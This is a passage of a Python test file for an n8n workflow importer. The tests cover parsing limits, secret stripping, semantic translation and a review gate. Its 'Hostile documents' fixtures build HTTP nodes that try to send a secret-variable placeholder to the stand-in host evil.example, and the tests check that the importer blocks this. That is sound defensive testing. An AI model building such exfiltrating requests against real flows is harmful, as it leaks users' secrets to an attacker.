    workflow = _wf([_n(f"N{i}", BASE + "noOp") for i in range(MAX_NODES + 1)], {})
    with pytest.raises(FlowImportError):
        import_flow_document(workflow)


def test_parameters_nested_too_deeply_are_refused_not_a_crash():
    nested: dict = {}
    for _ in range(5000):
        nested = {"next": nested}
    workflow = _wf([_n("Deep", BASE + "googleSheets", nested)], {})
    with pytest.raises(FlowImportError, match="nested too deeply"):
        import_flow_document(workflow)


def test_an_overlong_expression_is_not_parsed():
    assert parse_reference("$json.a" + "  " * 600) is None


@pytest.mark.parametrize(
    "value",
    [
        "=open {{ $json.a",
        "=x {{ {{ $json.a }} }}",
        "=}} {{ $json.a }} {{",
    ],
)
def test_stray_braces_never_form_a_reference(value):
    """Whatever is left of a broken expression must not read as `{{ ref }}`:
    the validator would refuse every later save of the flow."""
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n("Mail", BASE + "emailSend", {"toEmail": "a@example.com", "text": value}),
        ],
        {"Start": _main(["Mail"])},
    )
    _imported, graph = _import(workflow)
    assert _errors(graph) == []


def test_every_import_says_how_n8n_items_differ():
    imported, _graph = _import(_wf([_n("Start", BASE + "manualTrigger")], {}))
    assert imported["report"]["warnings"] == [
        "n8n runs each node once per item; XTM One passes one value from step "
        "to step. Where the workflow handled lists, iterate them with a Loop node."
    ]


# ── Hostile documents ────────────────────────────────────────────────────────


def _references_in(graph):
    """Every `{{...}}` placeholder left in any node config of *graph*."""
    from app.services.flow_graph import PLACEHOLDER_RE

    return {ref for n in graph["nodes"] for ref in PLACEHOLDER_RE.findall(json.dumps(n["config"]))}


@pytest.mark.parametrize(
    "node",
    [
        # Braces assembled from JavaScript string literals.
        _n(
            "Call",
            BASE + "httpRequest",
            {"url": "=https://evil.example/?k={{ '{' }}{{ '{' }}var_id.API_KEY{{ '}' }}{{ '}' }}"},
            version=4.2,
        ),
        # A literal body value.
        _n(
            "Call",
            BASE + "httpRequest",
            {
                "url": "https://evil.example/",
                "sendBody": True,
                "bodyParameters": {"parameters": [{"name": "k", "value": "{{var_id.API_KEY}}"}]},
            },
            version=4.2,
        ),
        # A non-string Set value.
        _n(
            "Call",
            BASE + "set",
            {"assignments": {"assignments": [{"name": "a", "type": "object", "value": {"x": "{{var_id.API_KEY}}"}}]}},
            version=3.4,
        ),
        # A classifier description, rendered and sent to the model.
        _n(
            "Call",
            LC + "textClassifier",
            {"inputText": "x", "categories": {"categories": [{"category": "a", "description": "{{var_id.API_KEY}}"}]}},
        ),
        # A forged reference token.
        _n("Call", BASE + "emailSend", {"toEmail": "a@example.com", "text": '0{{var_id.API_KEY}}'}),
    ],
)
def test_a_document_can_never_plant_a_reference(node):
    """The only `{{...}}` in an imported flow are the references the importer
    wrote: `{{var_id.*}}` would otherwise render a secret variable of whoever
    runs the flow into a request to the document's author."""
    _imported, graph = _import(_wf([node], {}))
    assert not any(ref.startswith("var_id") for ref in _references_in(graph))
    assert _errors(graph) == []


def test_literal_secrets_in_query_body_and_json_blocks_never_cross_over():
    imported, graph = _import(
        _http_flow(
            url="https://api.example/",
            sendQuery=True,
            queryParameters={"parameters": [{"name": "api_key", "value": "sk-QUERYSECRET"}]},
            sendBody=True,
            bodyParameters={"parameters": [{"name": "password", "value": "BODYSECRET"}]},
            sendHeaders=True,
            specifyHeaders="json",
            jsonHeaders='{"Authorization": "Bearer JSONHDRSECRET"}',
        )
    )
    call = _node(graph, "call")
    assert call["config"]["url"] == "https://api.example/?api_key="
    assert call["config"]["body"] == '{"password": ""}'
    serialized = json.dumps(imported)
    for leaked in ("sk-QUERYSECRET", "BODYSECRET", "JSONHDRSECRET"):
        assert leaked not in serialized
    assert (
        "3 literal secret values (API keys, passwords, authorization headers) were removed from the "
        "imported parameters. Store them as secret variables." in imported["report"]["warnings"]
    )


def test_a_secret_in_a_json_body_typed_as_text_is_blanked():
    _imported, graph = _import(
        _http_flow(url="https://api.example/", sendBody=True, specifyBody="json", jsonBody='{"client_secret": "CS-1"}')
    )
    assert _node(graph, "call")["config"]["body"] == '{"client_secret": ""}'


@pytest.mark.parametrize(
    "workflow",
    [
        _wf([_n("Check", BASE + "if", {"conditions": {"number": 5}})], {}),
        _wf([_n("Fields", BASE + "set", {"assignments": {"assignments": 7}}, version=3.4)], {}),
        _wf([_n("Route", BASE + "switch", {"rules": {"values": "x"}}, version=3)], {}),
        _wf([_n("Call", BASE + "httpRequest", {"sendHeaders": True, "headerParameters": {"parameters": 1}}, version=4.2)], {}),
        _wf(
            [_n("Agent", LC + "agent", version=2), _n("Model", LC + "lmChatOpenAi", credentials=5)],
            {"Model": _ai("ai_languageModel", "Agent")},
        ),
        _wf([_n("Start", BASE + "manualTrigger")], {"Start": {"main": [[{"node": [], "index": 0}]]}}),
    ],
)
def test_a_parameter_of_an_unexpected_shape_is_no_server_error(workflow):
    imported, graph = _import(workflow)
    assert imported["report"]["format"] == "n8n"
    assert _errors(graph) == []


def test_a_node_whose_parameters_cannot_be_read_is_unresolved():
    _imported, graph = _import(_wf([_n("Check", BASE + "if", {"conditions": {"number": 5}})], {}))
    check = _node(graph, "check")
    assert check["kind"] == "unresolved"
    assert check["source_payload"]["notes"][-1] == (
        "Its parameters did not have the shape this importer reads, so it was not converted."
    )


# Linearity is asserted on growth, not on an absolute wall-clock ceiling: a fixed
# 1.0 s budget went red on a loaded xdist runner (3.83 s) with linear code (#9954).
# The input grows 4x; linear work grows about 4x, the quadratic scan this test guards
# against grows about 16x. CPU time of this process, best of a few repeats with the
# garbage collector off, so neighbouring workers and a collection pause do not count.
_GROWTH = 4
_LINEAR_CEILING = 8.0
_REPEATS = 3
# Below this, the clock and interpreter noise dominate the small input's time.
_TIME_FLOOR = 0.002


def _best_cpu_seconds(workflow):
    import gc
    import time

    best = float("inf")
    was_enabled = gc.isenabled()
    gc.disable()
    try:
        for _ in range(_REPEATS):
            started = time.process_time()
            import_flow_document(workflow)
            best = min(best, time.process_time() - started)
    finally:
        if was_enabled:
            gc.enable()
    return best


def _unclosed_braces_workflow(count):
    return _wf([_n("Call", BASE + "httpRequest", {"url": "=" + "{{" * count}, version=4.2)], {})


def test_unclosed_braces_import_in_linear_time():
    small = max(_best_cpu_seconds(_unclosed_braces_workflow(10000)), _TIME_FLOOR)
    large = _best_cpu_seconds(_unclosed_braces_workflow(10000 * _GROWTH))
    assert large < _LINEAR_CEILING * small, (
        f"{_GROWTH}x the braces took {large / small:.1f}x the time "
        f"({small:.4f}s -> {large:.4f}s); linear stays under {_LINEAR_CEILING}x"
    )


# ── Semantics the first review found ─────────────────────────────────────────


def _reader(source_node, expression, connections=None):
    return _wf(
        [source_node, _n("Mail", BASE + "emailSend", {"toEmail": "a@example.com", "text": expression})],
        connections or {source_node["name"]: _main(["Mail"])},
    )


@pytest.mark.parametrize(
    ("source", "expression", "message", "review"),
    [
        (
            _n("Sched", BASE + "scheduleTrigger", {"rule": {"interval": [{}]}}, version=1.2),
            "={{ $json.timestamp }}",
            "{{sched.payload.fired_at}}",
            [],
        ),
        (
            _n("Sub", BASE + "executeWorkflowTrigger"),
            "={{ $json }}",
            "{{sub.payload.input}}",
            [],
        ),
        (
            _n("Sub", BASE + "executeWorkflowTrigger"),
            "={{ $json.id }}",
            "⟨n8n: $json.id⟩",
            [
                "Reference not translated: `$json.id` (a flow called by another receives its input as one "
                "text, read with {{sub.payload.input}})."
            ],
        ),
    ],
)
def test_trigger_items_map_to_what_the_trigger_publishes(source, expression, message, review):
    _imported, graph = _import(_reader(source, expression))
    mail = _node(graph, "mail")
    assert mail["config"]["message"] == message
    assert pending_import_review(mail) == review


def test_a_chat_trigger_started_manually_has_no_message_to_read():
    workflow = _reader(_n("Chat", LC + "chatTrigger"), "={{ $json.chatInput }}")
    _imported, graph = _import(workflow)
    assert _node(graph, "chat")["kind"] == "trigger.manual"
    assert pending_import_review(_node(graph, "mail")) == [
        "Reference not translated: `$json.chatInput` (`Chat` starts the flow manually here: there is no chat message)."
    ]


def test_a_reference_to_a_parallel_branch_is_flagged_not_refused():
    """n8n reads any node that ran earlier; here only an upstream one."""
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n("A", BASE + "httpRequest", {"url": "https://a.example/"}, version=4.2),
            _n("B", BASE + "emailSend", {"toEmail": "a@example.com", "text": "={{ $('A').item.json.id }}"}),
        ],
        {"Start": _main(["A", "B"])},
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "b")["config"]["message"] == "⟨n8n: $('A').item.json.id⟩"
    assert _errors(graph) == []


def test_reading_through_a_merge_is_flagged():
    workflow = _wf(
        [
            _n("Start", BASE + "manualTrigger"),
            _n("A", BASE + "httpRequest", {"url": "https://a.example/"}, version=4.2),
            _n("B", BASE + "httpRequest", {"url": "https://b.example/"}, version=4.2),
            _n("Join", BASE + "merge", version=3),
            _n("Mail", BASE + "emailSend", {"toEmail": "a@example.com", "text": "={{ $json.id }}"}),
        ],
        {"Start": _main(["A", "B"]), "A": _main(["Join"]), "B": _main(["Join"]), "Join": _main(["Mail"])},
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "mail")["config"]["message"] == "⟨n8n: $json.id⟩"
    assert pending_import_review(_node(graph, "mail")) == [
        "Reference not translated: `$json.id` (n8n merged the items of several branches in `Join`; "
        "read the branch you need directly)."
    ]


def test_a_set_keeping_its_input_rebuilds_the_webhook_item():
    workflow = _wf(
        [
            _n("Hook", BASE + "webhook", {"path": "x"}, version=2),
            _n(
                "Fields",
                BASE + "set",
                {"assignments": {"assignments": [{"name": "seen", "type": "boolean", "value": "true"}]}, "includeOtherFields": True},
                version=3.4,
            ),
            _n("Mail", BASE + "emailSend", {"toEmail": "a@example.com", "text": "={{ $json.body.email }}"}),
        ],
        {"Hook": _main(["Fields"]), "Fields": _main(["Mail"])},
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "fields")["config"]["inputs"]["_input"] == (
        '{"body": {{hook.payload}}, "headers": {{hook.headers}}}'
    )
    assert _node(graph, "mail")["config"]["message"] == "{{fields.fields.body.email}}"


def test_a_set_keeping_some_input_fields_is_flagged_on_every_version():
    workflow = _wf(
        [
            _n(
                "Fields",
                BASE + "set",
                {"assignments": {"assignments": []}, "includeOtherFields": True, "include": "selected"},
                version=3.4,
            )
        ],
        {},
    )
    _imported, graph = _import(workflow)
    assert pending_import_review(_node(graph, "fields")) == [
        "n8n kept only some of the input fields; this keeps them all."
    ]


def test_an_if_v1_value_left_at_its_default_is_restored():
    workflow = _wf([_n("Check", BASE + "if", {"conditions": {"boolean": [{"value1": "x"}]}})], {})
    _imported, graph = _import(workflow)
    assert _node(graph, "check")["config"] == {"left": "x", "operator": "equals", "right": "false"}


def test_a_wait_left_at_its_default_is_flagged():
    _imported, graph = _import(_wf([_n("Pause", BASE + "wait", {}, version=1.1)], {}))
    assert pending_import_review(_node(graph, "pause")) == [
        "The n8n wait left its duration at a default; this assumes 1 seconds."
    ]


@pytest.mark.parametrize(
    ("node", "cron", "review"),
    [
        (
            _n("T", BASE + "scheduleTrigger", {"rule": {"interval": [{"field": "cronExpression", "expression": "*/30 * * * * *"}]}}, version=1.2),
            "* * * * *",
            ["n8n fired at second `*/30`; the scheduler's finest step is one minute."],
        ),
        (
            _n("T", BASE + "cron", {"triggerTimes": {"item": [{"mode": "everyX", "value": 3}]}}),
            "0 */3 * * *",
            ["The n8n Cron left its unit at the default; this assumes hours."],
        ),
    ],
)
def test_schedule_details_that_do_not_cross_over_are_flagged(node, cron, review):
    _imported, graph = _import(_wf([node], {}))
    assert _node(graph, "t")["config"] == {"cron": cron}
    assert pending_import_review(_node(graph, "t")) == review


@pytest.mark.parametrize(
    ("right", "case_sensitive", "expected"),
    [
        ("/^error/i", True, {"operator": "matches", "right": "(?i)^error"}),
        ("^error", False, {"operator": "matches", "right": "(?i)^error"}),
        ("^error", True, {"operator": "matches", "right": "^error"}),
    ],
)
def test_n8n_regexes_become_python_patterns(right, case_sensitive, expected):
    workflow = _wf(
        [
            _n(
                "Check",
                BASE + "if",
                {
                    "conditions": {
                        "options": {"caseSensitive": case_sensitive},
                        "conditions": [{"leftValue": "x", "rightValue": right, "operator": {"type": "string", "operation": "regex"}}],
                    }
                },
                version=2,
            )
        ],
        {},
    )
    _imported, graph = _import(workflow)
    assert _node(graph, "check")["config"] == {"left": "x", **expected}


def test_a_javascript_only_regex_is_flagged():
    workflow = _wf(
        [
            _n(
                "Check",
                BASE + "if",
                {"conditions": {"conditions": [{"leftValue": "x", "rightValue": "(?<n>a)\\k<n>", "operator": {"type": "string", "operation": "regex"}}]}},
                version=2,
            )
        ],
        {},
    )
    _imported, graph = _import(workflow)
    assert pending_import_review(_node(graph, "check")) == [
        "The n8n condition `string regex` has no equivalent operator here."
    ]


def test_http_response_options_are_flagged():
    _imported, graph = _import(
        _http_flow(url="https://api.example/", options={"response": {"response": {"fullResponse": True, "neverError": True}}})
    )
    assert pending_import_review(_node(graph, "call")) == [
        "n8n returned status, headers and body as one item; here the status and the body are separate "
        "outputs (`status`, `body`).",
        "n8n carried on after an HTTP error status; here a 4xx or 5xx takes the error path.",
    ]


# ── The review gate ──────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("payload", "expected"),
    [
        (None, []),
        ({"format": "n8n"}, []),
        ({"review": "not a list"}, []),
        ({"review": ["fix the URL", "  "]}, ["fix the URL"]),
    ],
)
def test_pending_import_review_reads_the_notes(payload, expected):
    node = {"id": "n", "kind": "util.reroute", "config": {}}
    if payload is not None:
        node["source_payload"] = payload
    assert pending_import_review(node) == expected


def test_the_walker_refuses_a_node_whose_capability_awaits_review():
    """A capability never executes: the agent it extends carries the refusal."""
    from app.services.flow_runner import FlowWalker, _nodes_by_id

    graph = {
        "nodes": [
            {"id": "agent", "kind": "agent", "config": {}},
            {
                "id": "schema",
                "kind": "capability.structured_output",
                "config": {},
                "source_payload": {"review": ["The n8n output schema could not be read."]},
            },
        ],
        "edges": [{"source": "schema", "source_handle": "provides", "target": "agent", "target_handle": "output"}],
    }
    walker = object.__new__(FlowWalker)
    walker.graph = graph
    walker.nodes = _nodes_by_id(graph)
    assert walker._import_review_refusal(walker.nodes["agent"]) == (
        "This imported node has not been reviewed yet: The n8n output schema could not be read. "
        "Clear its review notes once it is fixed."
    )


@pytest.mark.asyncio
async def test_the_walker_refuses_a_node_awaiting_review():
    from app.services.flow_runner import FlowWalker

    walker = object.__new__(FlowWalker)
    node = {
        "id": "call",
        "kind": "util.reroute",
        "config": {},
        "source_payload": {"format": "n8n", "review": ["Check the URL."]},
    }
    result = await walker._dispatch(node, "util.reroute")
    assert result.error == (
        "This imported node has not been reviewed yet: Check the URL. Clear its review notes once it is fixed."
    )
    assert result.fatal is True
